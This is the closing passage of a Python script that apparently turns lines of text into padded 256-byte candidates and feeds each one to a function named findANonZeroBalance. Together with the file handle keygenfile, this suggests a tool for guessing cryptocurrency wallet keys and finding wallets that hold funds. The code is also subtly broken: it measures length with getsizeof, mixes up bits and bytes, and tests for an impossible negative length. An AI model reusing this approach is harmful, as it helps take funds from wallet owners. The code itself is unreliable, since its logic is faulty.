		# TODO: more encodings
		tempLine = str(textLine).strip()
		tempLine = bytes(tempLine, 'utf-8')

		# Can only be 128, 160, 192, 224, or 256 bits
		# TODO: do the below permutations for each bit length
		tempLineByteLength = getsizeof(tempLine)
		maxByteLength = 256

		# Too long, just use the first or last 256 bytes
		if (tempLineByteLength > maxByteLength):
			# First 256
			findANonZeroBalance(tempLine[:maxByteLength])

			# Last 256
			findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:])

		# Edge case - doesn't exist
		elif (tempLineByteLength < 0):
			findANonZeroBalance('')

		# Let's start permutating
		else:
			# TODO: Do every permutation of padding (1L-255R, 2L-254R)
			# TODO: is my math right?
			pad = maxByteLength - tempLineByteLength

			# Pad on the left
			findANonZeroBalance(bytes(pad) + tempLine)
			
			# Pad on the right
			findANonZeroBalance(tempLine + bytes(pad))

			# Pad 50/50 Left/Right split
			findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)))
			
	keygenfile.close()


if __name__=="__main__":
    main()
